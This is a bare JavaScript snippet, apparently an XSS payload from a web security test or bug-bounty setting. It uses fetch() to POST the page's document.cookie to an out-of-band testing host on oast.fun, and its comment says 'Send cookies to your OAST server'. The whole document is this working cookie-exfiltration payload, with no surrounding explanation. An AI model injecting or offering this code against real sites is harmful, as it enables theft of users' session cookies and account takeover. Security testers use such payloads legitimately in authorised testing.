// Send cookies to your OAST server
fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
  method: 'POST',
  body: `Cookies: ${document.cookie}`,
});
